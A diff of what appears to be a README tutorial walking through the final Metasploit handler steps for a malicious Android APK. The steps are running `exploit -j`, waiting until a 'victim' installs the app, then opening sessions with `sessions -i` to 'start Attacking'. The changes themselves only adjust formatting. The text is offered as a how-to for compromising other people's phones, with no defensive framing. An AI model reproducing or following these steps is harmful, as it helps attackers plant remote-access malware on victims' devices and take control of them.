@@ -34,17 +34,18 @@ Now run This command for verify Both LHOST and LPORT  `show`
 12. Now if your Payload not Working set EXit commad
 13. Run `set ExitOnSession false`
 14. 
-  **NOW RUN PAYLOAD**
-15. `exploit -j`
+**NOW RUN PAYLOAD**
+
+`exploit -j`
 Now Your Payload is successfull Work in Background OF victims Android
 
 Now When Victim Install This Apk ,,  Session automatically Start..
 
-16. Run `sessions -i` and see the **ID** of Active Session (Example : 1 , 2, 3....)
+16. Run `sessions -i` and see the **ID** of Active Session (Example iD: 1 , 2, 3....)
 17.  Now Run `sesssion -i <ID>`  and start Attacking
 18. For performing Attack Run `help` and All commands you can Apply for Attack
 
-**Thanks for Visiting @Yuvrajchauhan457  **
+**Thanks for Visiting @Yuvrajchauhan457**
 
 
 
